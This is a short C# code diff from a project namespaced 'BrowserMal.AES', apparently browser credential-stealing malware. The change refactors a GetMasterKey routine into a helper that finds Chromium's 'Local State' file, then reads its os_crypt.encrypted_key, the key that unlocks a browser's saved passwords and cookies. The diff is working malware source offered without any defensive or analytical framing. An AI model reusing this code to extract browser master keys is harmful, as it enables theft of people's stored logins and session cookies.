@@ -29,21 +29,33 @@ namespace BrowserMal.AES
             return result;
         }
 
+        private static string FindLocalState(string basePath)
+        {
+            string localStateFile = "\\Local State";
+
+            string parentPath = Directory.GetParent(basePath).Parent.FullName;
+            string path = parentPath + localStateFile;
+
+            if (File.Exists(path))
+                return path;
+
+            parentPath = Path.GetDirectoryName(basePath);
+            path = parentPath + localStateFile;
+
+            if (File.Exists(path))
+                return path;
+
+            return null;
+        }
+
         public static byte[] GetMasterKey(string basePath)
         {
-            string parentPath = Directory.GetParent(basePath).Parent.FullName;
-            string path = parentPath + "\\Local State";
+            string path = FindLocalState(basePath);
 
-            if (!System.IO.File.Exists(path))
-            {
-                parentPath = Path.GetDirectoryName(basePath);
-                path = parentPath + "\\Local State";
-            }
-
-            if (!System.IO.File.Exists(path))
+            if (path == null)
                 return null;
 
-            string jsonString = System.IO.File.ReadAllText(path);
+            string jsonString = File.ReadAllText(path);
 
             dynamic jsonObject = JsonConvert.DeserializeObject(jsonString);
             string key = jsonObject.os_crypt.encrypted_key;
